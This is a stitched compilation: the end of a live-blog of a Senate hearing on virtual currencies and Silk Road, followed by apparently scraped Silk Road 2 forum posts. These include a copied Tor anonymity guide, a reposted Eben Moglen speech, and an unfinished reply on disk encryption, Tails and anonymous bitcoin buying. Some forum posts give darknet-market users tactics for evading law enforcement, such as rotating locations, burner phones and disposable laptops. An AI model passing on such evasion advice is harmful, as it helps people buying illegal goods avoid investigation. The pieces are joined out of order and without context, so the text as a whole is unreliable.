Conveniently, many of the laws are very flexible.4:06 EST- Sen. Tom Carper After the SILK ROAD shut down, many have popped up in its place. ""How do we combat these websites?""4:07 EST- Edward LowryWe believe there are 3 infrastructures in place. The SILK ROAD forums, the digital currencies (those which fall outside of the guidance of FINCEN), and ""bulletproof hosting"" -an organization that provides web hosting to anyone with servers in countries with little regulation.4:09 EST- Mythili RamenThe main problem is anonymity. The criminal division has created tools and strategies to combat this. (not said) but this is the TOR javascript exploit We have been successful in combating criminals who use anonymity to continue illegal activity.4:10 EST- Sen. Tom CarperBitcoin and virtual currencies may move overseas to countries with less regulatory agencies. What can we do to combat this? How do we make business stay in the US?4:12 EST-jennifer Shasky CalveryBitcoin is going to be a big player in the future of the exchange of goods and services. The financial action task force does a good job at making the countries around the world comply with regulatory laws.4:15 EST - Mythili RamenThis hearing is important for the law agencies because talking about these problems is not easy. Virtual currencies in of themselves are not illegal. Innovation is important. Just as criminals have done for ages, this is just another means for illegal activity. We need to stay vigilant in keeping pace with evolving virtual currencies.4:17 EST- Edward LowryThe secret service will continue to work strategically to remove the gravest structures to the [US] infrastructure. We are going to have to adopt and jump over hurdles but we will work with foreign partners to make this happen. We will continue to work as a part of DHS to eliminate these threats. We believe that aggressive acts by law enforcement will benefit the world as a whole4:18 EST-Jennifer Shasky CalveryI heard a CEO of a fairly large bank say, ""having the privilege to be a part of the financial industry comes with great responsibility. While innovation is a wonderful thing, it does come with obligations to become part of the US financial system. Regulation in place have help in minimizing the risk and the burden. We ask that businesses do this, put in place AML protections, register with FINCEN, maintain records (including suspicious reports)We believe that these requests are reasonable because these currencies have already been used for illicit activity.4:21 EST- Sen. Tom Carper""This has been a thought provoking and encouraging discussion""""It's not true We have to choose between a stronger economy and a clean environment""""Is it possible to reap the benefits of this virtual currencies while still being able to clean up criminal activity?""-RECESS- and change of panel4:28 EST Introduction by Sen. Tom CarperErnie Allen- Centre for missing & Exploited childrenPatrick Murck-General council of BITCOIN foundationJerry Brito-Senior researcher of Technology at George Mason university.Jeremy Allaire- Circle Internet Financial CEO4:30 EST- Ernie Allen Our goal is to bring people together to protect the digital economy while combating its misuse. We are excited for digital currencies to give ""banking"" to adults all over the world. Our concern today is the use of digital currencies in child pornography. Most countries have not added regulation to digital currencies.Over the past year, I have consulted financial experts of this issue. Child pornography is being created and disseminated by using anatomizing technologies and virtual currencies.Freedom hosting was shut down by law enforcement by penetrating a loophole in freedom hosting's servers which gave users identities away.Most of the arrests of those using anonymous networks are of those who are misusing the network. Because of this, we believe that we are not catching the high-level criminals who are using these networks.We can press for global cooperation to solve these problems. Digital currencies move from nation to nation.We need to address the core problem which is internet anonymity. An environment in which child exploiters can thrive and not be caught should not be allowed.Anonymity allows illegal activity, but also acts to give a voice to those against oppressive regimes.4:39 EST- Patrick MurckThere is no single bitcoin company that manages the value of bitcoin or the trade of bitcoins.Bitcoin is like email for money. It is secure any completely transparent. Bitcoin can operate without 3rd parties.Financial exclusion is a problem for the US. There is a rising tide of un-banked people within our borders. Bitcoin can help move people from a trapped economy to a globally connected economy.Just like any currency, bitcoin can be used for illegal activity. It is no easier to commit crime with bitcoin then it is with any other currency.Keeping the bitcoin network safe is all of out opportunity. When the SILK ROAD was shut down, the bitcoin community was excited.Bitcoin is not some magical cloaking device that allows criminals free reign. The use of bitcoins is not un-regulated. The exchanges have a deep understanding of how to effectively allow users to trade bitcoin with fiat currencies.Bitcoin exchanges- ""If you give us clear rules, we will work to abide by them""We would like to thank FINCEN to opening up the dialog about bitcoin. The bitcoin foundation looks forward to continuing in this dialog with the government and the public.4:47 EST- Jeremy AllaireAs bitcoin moves into mainstream acceptance, it is important that governments fully understand how to include bitcoin into existing laws.Bitcoin allows innovation in currency, exchange, and payment that many other currencies cannot offer. Much of our current infrastructure for finances has existed before the internet was invented.It is a risk if the government doesn't support businesses that want to use bitcoins. Such businesses may be encouraged to move offshore.The U.S. falls behind in this critical economic innovation. A bitcoin exchange in CHINA has become the single largest currency exchange in the world . We need to be open and evolving.4:53 EST Jerry BritoFrom facebook credit to world of warcraft gold, Virtual currencies are nothing new.Prior to Bitcoins invention in 2009, all virtual currencies needed to be exchanged through an intermediary.Emerging technologies allow great benefits but great risks. 3-d printers revolutionize personal creation, but also creation of guns.While Bitcoin transactions don't need intermediaries, many exchanges can still convert government currency to bitcoins.Criminals are more likely to use centralized currencies because they can lie about how much money has been moved. Currencies such the bitcoin infrastructure show every transaction that happens.The U.S. could loose it's headstart on an emerging economy if it chooses to create strong regulatory laws.4:59 EST- Sen.

"Silk Road 2 Forums","DrAdamCarl","10491","2013-12-21T20:33:22","Best practices for Tor use, in light of  the fuckery thats going on","Discussion/Security","I got his from the link CLEARNET WARNING  http://security.stackexchange.com/questions/43369/best-practices-for-tor-use-in-light-of-released-nsa-slides   Your Computer  To date the NSA's and FBI's primary attacks on Tor users have been MITM attacks (NSA) and hidden service web server compromises (FBI) which either sent tracking data to the Tor user's computer, compromised it, or both. Thus you need a reasonably secure system from which you can use Tor and reduce your risk of being tracked or compromised.  Your Environment  Tor contains weaknesses which can only be mitigated through actions in the physical world. An attacker who can view both your local Internet connection, and the connection of the site you are visiting, can use statistical analysis to correlate them.      Never use Tor from home, or near home. Never work on anything sensitive enough to require Tor from home, even if you remain offline. Computers have a funny habit of liking to be connected... This also applies to anywhere you are staying temporarily, such as a hotel. Never performing these activities at home helps to ensure that they cannot be tied to those locations. (Note that this applies to people facing advanced persistent threats. Running Tor from home is reasonable and useful for others, especially people who aren't doing anything themselves but wish to help by running an exit node, relay or bridge.)      Limit the amount of time you spend using Tor at any single location. While these correlation attacks do take some time, they can in theory be completed in as little as a day. And while the jackboots are very unlikely to show up the same day you fire up Tor at Starbucks, they might show up the next day. I recommend for the truly concerned to never use Tor more than 24 hours at any single physical location; after that, consider it burned and go elsewhere. This will help you even if the jackboots show up six months later; it's much easier to remember a regular customer than someone who showed up one day and never came back. This does mean you will have to travel farther afield, especially if you don't live in a large city, but it will help to preserve your ability to travel freely.      When you go out to perform these activities, leave your cell phone turned on and at home.   Your Mindset  Many Tor users get caught because they made a mistake, such as posting their real email address in association with their activities. You must avoid this as much as possible, and the only way to do so is with careful mental discipline.      Think of your Tor activity as pseudonymous, and create in your mind a virtual identity to correspond with the activity. This virtual person does not know you and will never meet you, and wouldn't even like you if he knew you. He must be kept strictly mentally separated.      If you must use public Internet services, create completely new accounts for this pseudonym. Never mix them; for instance do not browse Facebook with your real email address after having used Twitter with your pseudonym's email on the same computer. Wait until you get home.      By the same token, never perform actions related to your pseudonymous activity via the clearnet, unless you have no other choice (e.g. to sign up for a provider who blocks Tor), and take extra precautions regarding your location when doing so.      If you need to make and receive phone calls, purchase an anonymous prepaid phone for the purpose. This is difficult in some countries, but it can be done if you are creative enough. Pay cash; never use a debit or credit card to buy the phone or top-ups. Never insert its battery or turn it on if you are within 10 miles (16 km) of your home, nor use a phone from which the battery cannot be removed. Never place a SIM card previously used in one phone into another phone. Never give its number or even admit its existence to anyone who knows you by your real identity. This may need to include your family members.   Go to the link to learn how to tay a little more secure when running hidden services. I copied and pasted only what I thought pertained to most of us.        Don't use Windows. Just don't. This also means don't use the Tor Browser Bundle on Windows. Vulnerabilities in the software in TBB figure prominently in both the NSA slides and FBI's recent takedown of Freedom Hosting.      If you can't construct your own workstation capable of running Linux and carefully configured to run the latest available versions of Tor, a proxy such as Privoxy, and a web browser, with all outgoing clearnet access firewalled, consider using Tails or Whonix instead, where most of this work is done for you. It's absolutely critical that outgoing access be firewalled so that third party applications cannot accidentally leak data about your location.      If you are using persistent storage of any kind, ensure that it is encrypted. Current versions of LUKS are reasonably safe, and major Linux distributions will offer to set it up for you during their installation. TrueCrypt might be safe, though it's not nearly as well integrated into the OS. BitLocker might be safe as well, though you still shouldn't be running Windows. Even if you are in a country where rubber hosing is legal, such as the UK, encrypting your data protects you from a variety of other threats.      Remember that your computer must be kept up to date. Whether you use Tails or build your own workstation from scratch or with Whonix, update frequently to ensure you are protected from the latest security vulnerabilities. Ideally you should update each time you begin a session, or at least daily. Tails will notify you at startup if an update is available.      Be very reluctant to compromise on JavaScript, Flash and Java. Disable them all by default. If a site requires any of these, visit somewhere else. Enable scripting only as a last resort, only temporarily, and only to the minimum extent necessary to gain functionality of a web site that you have no alternative for.      Viciously drop cookies and local data that sites send you. Neither TBB nor Tails do this well enough for my tastes; consider using an addon such as Self-Destructing Cookies to keep your cookies to a minimum. Of zero.      Your workstation must be a laptop; it must be portable enough to be carried with you and quickly disposed of or destroyed.      Don't use Google to search the Internet. A good alternative is Startpage; this is the default search engine for TBB, Tails and Whonix. Plus it won't call you malicious or ask you to fill out CAPTCHAs. ",""

Thank you. it's a pleasure to be here, and to see so many friends. I'm very grateful to David for the invitation, it's a privilege to be here. I'm going to talk of mostly about a subject almost as geeky as stuff we all talk about all the time, namely political economy. I'm going to try and make it less snooze-worthy than it sometimes seems to be, but you'll forgive me I'm sure for starting fairly far from OpenSSL, and we'll get closer as time goes by.  The developed economies around the world, all of them now, are beginning to experience a fundamentally similar and very depressing condition. They are required to impose austerity because levels of private debt have gummed up the works and the determination of the owners of capital to take vast risks with other peoples money have worked out extremely badly for the last half decade. And so austerity is the inevitable and politically damaging position for all the governments in the developed world, and some of those governments have begun to slip into a death spiral, in which the need to impose austerity and reduce public investment and welfare support for the young is harming economic growth, which prevents the austerity from having its desirable consequences. Instead of bad asset values being worked off and growth resuming, we are watching as the third largest economy in the world, the European Union, finds itself at the very verge of a currency collapse and a lost generation, which would have a profoundly depressing effect on the entire global economy.  For the policy-makers--I recognize that few of them are here, they have of course, better things to do than to listen to us--for the policy-makers in other words, an overwhelming problem is now at hand, how do we have innovation and economic growth under austerity?  They do not know the answer to this question and it is becoming so urgent that it is beginning to deteriorate their political control. Marginal parties in several very highly developed and thoughtful societies are beginning to attract substantial numbers of votes, and threatening the very stability of the economic planners' capacity to solve, or to attempt to solve, the problem of innovation under austerity.  This is not good news for anybody. This is not good for anybody. We have no opportunity to cheer for this outcome, which is largely the result of incompetence in those people who claim to be worth all that money because they're so smart, it is partly the result of the political cowardice that gave them too much room to swing their cats. It is not that we are glad to see this happen, but there is a silver lining to the cloud. There are very few people who know how to have innovation under austerity. We are they.  We have produced innovation under austerity for the last generation and not only did we produce pretty good innovation we've produced innovation that all the other smart rich people took most of the credit for. Most of the growth that occurred during this wild and wacky period in which they took other people's money and went to the racetrack with it, was with innovation we produced for them. So now, despite the really bad circumstances which we too can deplore, because the unemployment is my graduating law students, your children, and all those other young people whose lives are being harmed for good by current bad economic circumstances. The people beginning their careers now will suffer substantial wage losses throughout their lifetimes. Their children will get a less good start in life because of what is happening now, we cannot be pleased about this.  But we have a very substantial political opportunity. Because we do have the answer to the most important question pushing all the policy-makers in the developed world right now. That means we have something very important to say and I came here this morning primarily to begin the discussion about precisely how we should say it.  And I want to present a working first draft of our argument, I say ""our"" because I look around the room and I see it's us here this morning. Our argument, about what to do with the quandary the world is in. Innovation under austerity is not produced by collecting lots of money and paying it to innovation intermediaries. One of the most important aspects of 21st century political economy is that the process we call disintermediation, when we're begin jargony about it, is ruthless, consistent, and relentless. Television is melting. I don't need to tell you that, you know already. Nobody will ever try to create a commercial encyclopedia again. Amazon's lousy little I-will-let-you-read-some-books-unless-I-decide-to-take-them-back machine is transforming publishing by eliminating the selective power of the book publishers, much as Mr. Jobs almost destroyed the entire global music industry under the pretense of saving it. A task his ghost is already performing for the magazine publishers as you can see.   Disintermediation, the movement of power out of the middle of the net, is a crucial fact about 21st century political economy. It proves itself all the time. Somebody's going to win a Nobel Prize in economics for describing in formal terms the nature of disintermediation. The intermediaries who did well during the past 10 years, are limited to two sets: health insurers in the United States owing to political pathology, and the financial industry.  Health insurers in the United States may be able to capitalize on the continuing political pathology to remain failing and expensive intermediaries for a while longer. But the financial industry crapped in it's own nest and is shrinking now and will continue for some time to do so. The consequence of which is that throughout the economic system, as the policy-maker observes it, the reality that disintermediation happens and you can't stop it becomes a guiding light in the formation of national industrial policy. So we need to say it's true about innovation also.  The greatest technological innovation of the late 20th century is the thing we now call the World Wide Web. An invention less than 8000 days old. That invention is already transforming human society more rapidly than anything since the adoption of writing. We will see more of it. The nature of that process, that innovation, both fuels disintermediation, by allowing all sorts of human contacts to occur without intermediaries, buyers, sellers, agents, and controllers. And poses a platform in which a war over the depth and power of social control goes on, a subject I'll come back to in a few minutes. For now what I want to call attention to is the crucial fact that the World Wide Web is itself a result of disintermediated innovation.  What Tim first did at CERN was not the Web as we know it now, the Web as we know it now was made by the disintermediated innovation of an enormous number of individual people. I look back on what I wrote about the future of personal homepages in 1995, and I see pretty much what I thought then would happen happening, I said then those few personal homepages are grass seed and a prairie is going to grow, and so it did.  Of course, like all other innovation there were unintended consequences. The browser made the Web very easy to read. Though we built Apache, though we built the browsers, though we built enormous numbers of things on top of Apache and the browsers, we did not make the Web easy to write. So a little thug in a hooded sweatshirt made the Web easy to write, and created a man in the middle attack on human civilization, which is unrolling now to an enormous music of social harm. But that's the intermediary innovation that we should be concerned about. We made everything possible including, regrettably, PHP, and then intermediaries for innovation turned it into the horror that is Facebook. This will not turn out, as we can already see from the stock market result, to be a particularly favourable form of social innovation. It's going to enrich a few people. The government of Abu Dhabi, a Russian thug with a billion dollars already, a guy who can't wait to change his citizenship so he doesn't have to pay taxes to support the public schools, and a few other relics of 20th century misbehavior.  But the reality of the story underneath is, if we'd had a little bit more disintermediated innovation, if we had made running your own web-server very easy, if we had explained to people from the very beginning how important the logs are, and why you shouldn't let other people keep them for you, we would be in a rather different state right now. The next Facebook should never happen. It's intermediated innovation serving the needs of financiers, not serving the needs of people. Which is not say that social networking shouldn't happen, it shouldn't happen with a man in the middle attack built into it. Everybody in this room knows that, the question is how do we teach everybody else.  But as important as I consider everybody else to be right now, I want to talk about the policy-makers: how do we explain to them? And here we begin to divide the conversation into two important parts. One, what do we know about how to achieve innovation under austerity? Two, what prevents governments from agreeing with us about that?  So let me present first my first draft of the positive case for innovation under austerity, it's called ""We Made The Cloud"". ",""
"Silk Road 2 Forums","Travelling Without Moving","34848","2014-04-04T01:12:57","[22/05/2012 Eben Moglen speech] Innovation Under Austerity ","Discussion/Security","Disintermediation is beginning to come to higher education in the United States, which means it is beginning to come to higher education around the world. We currently have two models. Coursera, is essentially the googlization of higher education, spun-off from Stanford as a for-profit entity, using closed software and proprietary educational resources. MITx, which has now edX through the formation of the coalition with Harvard University, is essentially the free world answer. Similar online scalable curriculum for higher education delivered over Free Software using free education resources. We have an enormous stake in the outcome of that competition. And it behooves all of us to put as much of our energy as we can behind the solutions which depend upon free courseware everybody can use, modify and redistribute, and educational materials based on the same political economy.  Every society currently trying to reclaim innovation for the purpose of restarting economic growth under conditions of austerity needs more education, deliverable more widely at lower cost, which shapes young minds more effectively to create new value in their societies. This will not be accomplished without precisely the forms of social learning we pioneered. We said from the beginning that Free Software is the world's most advanced technical educational system. It allows anybody anywhere on earth, to get to the state of art in anything computers can be made to do, by reading what is fully available and by experimenting with it, and sharing the consequences freely. True computer science. Experimentation, hypothesis formation, more experimentation, more knowledge for the human race.  We needed to expand that into other areas of culture, and great heroes like Jimmy Wales and Larry Lessig laid out infrastructure for that to occur, we now need to get governments to understand how to push it further.  The Information Society Directorate of the European Commission issued a report 18 months ago, in which they said that they could scan 1/6th of all the books in European libraries for the cost of 100 km of roadway. That meant, and it is still true, that for the cost of 600 km of road, in an economy that builds thousands of kilometers of roadway every year, every book in all European libraries could be available to the entire human race, it should be done. [shout of ""Copyright"" from audience] Remember that most of those books are in the public domain, before you shout copyright at me. Remember that the bulk of what constitutes human learning was not made recently, before you shout the copyright at me. We should move to a world in which all knowledge previously available before this lifetime is universally available. If we don't, we will stunt the innovation which permits further growth. That's a social requirement. The copyright bargain is not immutable. It is merely convenient. We do not have to commit suicide culturally or intellectually in order to maintain a bargain which does not even relevantly apply to almost all of important human knowledge in most fields. Plato is not owned by anybody.  So here we are, asking ourselves what the educational systems of the 21st century will be like, and how they will socially distribute knowledge across the human race. I have a question for you. How many of the Einsteins who ever lived were allowed to learn physics? A couple. How many of the Shakespeares who ever lived, lived and died without learning to read and write? Almost all of them. With 7 billion people in the world right now, 3 billion of them are children; how many Einsteins do you want to throw away today? The universalization of access to education, to knowledge, is the single-most important force available for increasing innovation and human welfare on the planet. Nobody should be afraid to advocate for it because somebody might shout ""copyright"".  So we are now looking at the second-order consequence of an understanding of how to conduct innovation under austerity. Expand access to the materials that create the ability to learn, adapt technology to permit the scientists below age 20 to conduct their experiments and share their results, permit the continuing growth of the information technology universe we created, by sharing, over the last quarter century, and we'd begin to experience something like the higher rates of innovation available, despite massive decreases in social investment occurring because of austerity.  We also afford young people an opportunity to take their economic and professional destinies more into their own hands, an absolute requirement if we are to have social and political stability in the next generation. Nobody should be fooled about the prospects for social growth in societies where 50 percent of the people under 30 are unemployed. This is not going to be resolved by giving them assembly line car-building jobs. Everybody sees that. Governments are collectively throwing up their hands about what to do about the situation. Hence, the rapidity with which, in systems of proportional representation, young people are giving up on established political parties. When the Pirates can take 8.3% of the vote in Schleswig-Holstein, it is already clear that young people realize that established political policy-making is not going to be directed at their future economic welfare. And we need to listen, democratically, to the large number of young people around the world who insist that internet freedom and an end to snooping and control is necessary to their welfare and ability to create and live.  Disintermediation means there will be more service providers throughout the economy with whom we are directly in touch. That means more jobs outside hierarchies and fewer jobs inside hierarchies. Young people around the world whether they are my law students about to get a law license, or computer engineers about to begin their practices, or artists, or musicians, or photographers, need more freedom in the net, and more tools with which to create innovative service delivery platforms for themselves. A challenge to which their elders would not have risen successfully in 1955, but we are new generation of human beings working under new circumstances, and those rules have changed. They know the rules have changed. The indignados in every square in Spain know the rules have changed. It's their governments that don't know.  Which brings us I will admit to back to this question of anonymity, or rather, personal autonomy. One of the really problematic elements in teaching young people, at least the young people I teach, about privacy, is that we use the word privacy to mean several quite distinct things. Privacy means secrecy, sometimes. That is to say, the content of a message is obscured to all but it's maker and intended recipient. Privacy means anonymity, sometimes, that means messages are not obscured, but the points generating and receiving those messages are obscured. And there is a third aspect of privacy which in my classroom I call autonomy. It is the opportunity to live a life in which the decisions that you make are unaffected by others' access to secret or anonymous communication.",""
"Silk Road 2 Forums","Travelling Without Moving","34848","2014-04-04T01:14:06","[22/05/2012 Eben Moglen speech] Innovation Under Austerity ","Discussion/Security","The network, as it stands now, is an extraordinary platform for enhanced social control. Very rapidly, and with no apparent remorse, the two largest governments on earth, that of the United States of America and the People's Republic of China have adopted essentially identical points of view. A robust social graph connecting government to everybody and the exhaustive data mining of society is both governments fundamental policy with respect to their different forms of what they both refer to, or think of, as stability maintenance. It is true of course that they have different theories of how to maintain stability for whom and why, but the technology of stability maintenance is becoming essentially identical.  We need, we, who understand what is happening, need, to be very vocal about that. But it isn't just our civil liberties that are at stake, I shouldn't need to say that, that should be enough, but of course it isn't. We need to make clear that the other part of what that costs us is the very vitality and vibrancy of invention culture and discourse, that wide open robust and uninhibited public debate that the Supreme Court so loved in New York Times against Sullivan. And that freedom to tinker, to invent, to be different, to be non-conformist for which people have always moved to the cities that gave them anonymity, and a chance to experiment with who they are, and why they can do.  This more than anything else, is what sustains social vitality and economic growth in the 21st century. Of course we need anonymity for other reasons. Of course we are persuing something that might be appropriately described as protection for the integrity of the human soul. But that's not government's concern. It is precisely the glory of the way we understand civil society that that is not government's concern. It is precisely our commitment to the idea of the individual's development at her own pace, and in her own way, that has been the centerpiece of what we understood to be our society's fundamental commitment that means that the protection for the integrity of the human soul is our business, not the government's business. But government must attend to the material welfare of its citizens and it must attend to the long run good of the society they manage. And we must be clear to government that there is no tension between the maintenance of civil liberty in the form of the right to be let alone, there is no distinction between the civil liberty policy of assuring the right to be let alone, and the economic policy of securing innovation under austerity. They require the same thing.  We need Free Software, we need Free Hardware we can hack on, we need Free Spectrum we can use to communicate with one another, without let or hindrance. We need to be able to educate and provide access to educational material to everyone on earth without regard to the ability to pay. We need to provide a pathway to an independent economic and intellectual life, for every young person. The technology we need, we have, I have spent some time and many people in this room, including Isaac have spent more time now, trying to make use of cheap, power efficient compact server computers, the size of AC chargers for mobile phones, which with the right software we can use to populate the net with robots that respect privacy. Instead of the robots that disrespect privacy which we now carry in almost every pocket.  We need to retrofit the first law of robotics into this society within the next few minutes or we're cooked. We can do that. That's civil innovation. We can help to continue the long lifetime of general purpose computers everybody can hack on. By using them, by needing them, by spreading them around. We can use our own force as consumers and technologists to deprecate closed networks and locked-down objects, but without clear guidance in public policy we will remain a tiny minority, 8.3% let's say. Which will not be sufficient to lift us out of the slough into which the bankers have driven us.  Innovation under austerity is our battle-cry. Not a battle-cry for the things we most care about, but the ones the other people most care about. Our entree to social policy for the next five years, and our last chance to do in government what we have not been able to do by attempting to preserve our mere liberties. Which have been shamefully abused by our friends in government as well as by our adversaries.

I wish that I could say that the easiest thing to do was going to be to get our freedoms back, it isn't. Nobody will run in the election this year on the basis of the restoration of our civil liberties. But they will all talk about austerity and growth. And we must bring our message where they are.

"Silk Road 2 Forums","Travelling Without Moving","34848","2014-04-04T01:12:15","[22/05/2012 Eben Moglen speech] Innovation Under Austerity ","Discussion/Security","Everybody understands this in this room too. The very point about what's happening to information technology in the world right now, has to do with scaling up our late 20th century work. We created the idea that we could share operating systems and all the rest of the commoditizable stack on top of them. We did this using the curiosity of young people. That was the fuel, not venture capital. We had been at it for 15 years, and our stuff was already running everywhere, before venture capital or even industrial capital raised by IT giants came towards us. It came towards us not because innovation needed to happen, but because innovation had already happened, and they needed to monetize it. That was an extremely positive outcome, I have nothing bad to say about that. But the nature of that outcome, indeed the history as we lived it and as other can now study it, will show how innovation under austerity occurred. It's all very well to say that it happened because we harnessed the curiosity of young people, that's historically correct. But there's more than that to say.  What we need to say is that that curiosity of young people could be harnessed because all of the computing devices in ordinary day to day use were hackable. And so young people could actually hack on what everybody used. That made it possible for innovation to occur, where it can occur, without friction, which is at the bottom of the pyramid of capital. This is happening now elsewhere in the world as it happened in the United States in the 1980s. Hundreds of thousands of young people around the world hacking on laptops. Hacking on servers. Hacking on general purpose hardware available to allow them to scratch their individual itches, technical, social, career, and just plain ludic itches. ""I wanna do this it would be neat."" Which is the primary source of the innovation which drove all of the world's great economic expansion in the last 10 years. All of it. Trillions of dollars of electronic commerce. Those of you old enough to remember when fighting Public Key Encry ption tooth and nail, was the United States government's policy will remember how hard they fought, to prohibit 3.8 trillion dollars worth of electronic commerce from coming into existence in the world.  We were supposedly proponents of nuclear terrorism and pedophilia in the early 1990s, and all the money that they earned in campaign donations and private equity profits and all the rest of it, is owing to the globalization of commerce we made possible, with the technology they wanted to send our clients to jail for making. That demonstrates neatly I think, to the next generation of policy-makers how thoroughly their adherence to the received wisdom is likely to contribute to the death spiral they now fear they're going to get into. And it should embolden us to point out once again that the way innovation really happens is that you provide young people with opportunities to create on an infrastructure which allows them to hack the real world, and share the results.  When Richard Stallman wrote the call at the university in Suffolk for the universal encyclopedia, when he and Jimmy Wales and I were all much younger than we are now, it was considered a frivolous idea. It has now transformed the life of every literate person in the world. And it will continue to do so.  The nature of the innovation established by Creative Commons, by the Free Software Movement, by Free Culture, which is reflected in the Web in the Wikipedia, in all the Free Software operating systems now running everything, even the insides of all those locked-down vampiric Apple things I see around the room. All of that innovation comes from the simple process of letting the kids play and getting out of the way. Which, you are aware, we are working as hard as we can to prevent now completely. Increasingly, all around the world the actual computing artifacts of daily life for human individual beings are being made so you can't hack them. The computer science laboratory in every twelve year old's pocket is being locked-down.  When we went through the anti-lockdown phase of the GPL 3 negotiations in the middle of last decade, it was somehow believed that the primary purpose for which Mr. Stallman and I were engaged in pressing everybody against lock-down had something to do with bootlegging movies. And we kept saying, this is not the Free Movie Foundation. We don't care about that. We care about protecting people's right to hack what they own. And the reason we care about it is, that if you prevent people from hacking on what they own themselves, you will destroy the engine of innovation from which everybody is profiting.  That's still true. And it is more important now precisely because very few people thought we were right then, and didn't exert themselves to support that point of view, and now you have Microsoft saying we won't allow third-party browsers on ARM-based Windows RT devices. And you have the ghost of Mr. Jobs trying to figure out how to prevent even a free tool chain from existing in relation to IOS, and you have a world in which increasingly the goal of the network operators is to attach every young human being to a proprietary network platform with closed terminal equipment that she can't learn from, can't study, can't understand, can't whet her teeth on, can't do anything with except send text messages that cost a million times more than they ought to.  And most of the so-called innovation in the world, in our sector, now goes into creating IT for network operators that improves no technology for users. Telecomms innovation in the world has basically ceased. And it will not revive so long as it is impossible to harness the forms of innovation that really work under austerity.  This has a second-order consequence of enormous importance. Innovation under austerity occurs in the first-order because the curiosity of young people is harnessed to the improvement of the actual circumstances of daily life. The second-order consequence is that the population becomes more educated.",""
"Silk Road 2 Forums","Travelling Without Moving","34848","2014-04-04T01:13:35","[22/05/2012 Eben Moglen speech] Innovation Under Austerity ","Discussion/Security","There is a reason that cities have always been engines of economic growth. It isn't because bankers live there. Bankers live there because cities are engines of economic growth. The reason cities have been engines of economic growth since Sumer, is that young people move to them, to make new ways of being. Taking advantage of the fact that the city is where you escape the surveillance of the village, and the social control of the farm. ""How you gonna keep them down on the farm after they've seen Paris?"" was a fair question in 1919 and it had a lot do with the way the 20th century worked in the United States. The city is the historical system for the production of anonymity and the ability to experiment autonomously in ways of living. We are closing it.  Some years ago, to wit, at the beginning of 1995 we were having a debate at the Harvard Law School about Public Key Encryption. Two on two. On one side Jamie Gorelick, then the Deputy Attorney General of the United States, and Stewart Baker, then as now at Steptoe & Johnson when he isn't in the United States government making horrendous social policy. On the other side, Danny Weitzner, now in the White House, and me. And we spent the afternoon talking back and forth about whether we should have to escrow our keys with the United States government, whether the clipper chip was going to work and many other very interesting subjects now as obsolete as Babylonia. And after it was all over, we walked across the Harvard campus for dinner at the Harvard Faculty Club and on the way across the campus Jamie Gorelick said to me ""Eben, on the basis of nothing more than your public statements this afternoon I have enough to order the interception of your telephone conversations."" In 1995 that was a joke. It was a joke in bad taste when told to a citizen by an official of the United States Justice Department. But it was a joke. And we all laughed because everybody knew you couldn't do that.  So we ate our dinner, and the table got cleared and all the plates went away, and the port and walnuts got scattered around, and Stewart Baker looked up and said ""alright, we'll let our hair down"", and he had none then and he has none now, but ""we'll let our hair down"" Stewart said, ""we're not going to prosecute your client Mr Zimmerman. We've spent decades in a holding action against Public Key Encryption it's worked pretty well but it's almost over now, we're gonna let it happen."" And then he looked around the table and he said, ""but nobody here cares about anonymity do they?"" A cold chill went up my spine.  And I thought, ""OK, Stewart, I understand how it is. You're going to let there be Public Key Encryption because the bankers are going to need it. And you're going to spend the next 20 years trying to stop people from being anonymous ever again, and I'm going to spend those 20 years trying to stop you."" So far I must say from my friend Mr. Baker has been doing better than I had hoped, and I have been doing even worse than I had feared. Partly because of the thug in a hoodie, and partly for other reasons. We are on the verge of the elimination of the human right to be alone. We are on the verge of the elimination of the human right to do your own thinking, in your own place, in your own way without anybody knowing. Somebody in this room just proved a couple of minutes ago that if he shops at a particular web-store using one browser, he gets a different price than on the other. Because one of the browsers is linked to his browsing history. Prices, offers, commodities, opportunities, are now being based upon the data mining of everything. A senior government official in this government said to me after the United States changed its rules about how long they keep information on everybody about whom nothing is suspected - you all do know about that right? Rainy Wednesday on the 21st of March, long after the close of business, Department of Justice and the DNI, that's the Director of National Intelligence, put out a joint press release announcing minor changes in the Ashcroft rules, including a minor change that says that all personally identifiable information in government databases at the National Center for Counter-Terrorism that are based around people of whom nothing is suspected, will no longer be retained as under the Ashcroft rules for a maximum of 180 days, the maximum has now been changed to 5 years. Which is infinity.  I told my students in my classroom, the only reason they said 5 years was they couldn't get the sideways eight into the font for the press release, so they used an approximation. So I was talking to a senior government official of this government about that outcome and he said well you know we've come to realize that we need a robust social graph of the United States. That's how we're going to connect new information to old information. I said let's just talk about the constitutional implications of this for a moment. You're talking about taking us from the society we have always known, which we quaintly refer to as a free society, to a society in which the United States government keeps a list of everybody every American knows. So if you're going to take us from what we used to call a free society to a society in which the US government keeps a list of everybody every American knows, what should be the constitutional procedure for doing this? Should we have, for example, a law? He just laughed. Because of course they didn't need a law. They did it with a press release on a rainy Wednesday night after everybody went home, and you live there now.  Whether it is possible to have innovation under conditions of complete despotism is an interesting question. Right-wing Americans or maybe even center-right Americans, have long insisted that one of the problems with 20th century totalitarianism, from which they legitimately distinguish themselves, was that it eliminated the possibility of what they call free markets and innovation. We're about to test whether they were right. ",""

"Silk Road 2 Forums","Agent","3635","2013-11-19T16:14:01","Looking for comments and criticisms about my security-overhaul","Discussion/Security","The first thing I will recommend is that you setup a Tor router either on a separate machine that you can connect with WiFi or over Ethernet, if you do not have a spare machine for such a purpose even if it was something like a RaspberryPi that would be perfect you can do the same within a VM and run that VM inside the profile you have setup for communication. The reason why I say this is because you are entrusting a lot of your security in propriety software and without knowing exactly how it runs that is a lot of risk you can do without, so the Tor router will force any information you are sending in and out to move over the Tor network.  The same propriety risk is also even worse if you choose to use FileVault, without looking it up myself I am assuming this is the encryption software that is built by Apple to use on their operating system and there is no way for you to know if their isn't backdoors or a master lock that LE would be able to use to get into that without a hitch. Truecrypt albeit I do not recommend it is an open source encryption solution that is used wildly by the public and offers great security but without the audit that should soon be going into play no one is one hundred percent about that applications authenticity.  Since you mentioned TAILS Linux I would suggest you simplify your setup by whipping your entire Apple Mac and reinstalling the version of OS X suited to your machine, then setup a Truecrypt container with a password that is twenty characters or more using lower/upper case, symbols and numerals. Use that encrypted volume to share between your main operating system which you use to download or view downloaded items in a sandbox environment or to even update your TAILS Linux installation using the built in upgrade from ISO application. Then setup a USB with TAILS Linux on it with a persistent volume and contain all of your Tor related and secure information activity onto one device that shuts down when it is pulled from the machine it is running on thus stopping LE from being able to access any of your data.  As for the way you want to purchase Bitcoins you are adding more risk by having other people involved as this could yield infinite bad results so it would be best for you to make your purchases of Bitcoins using the over the counter method with an exchange that does not require any form of 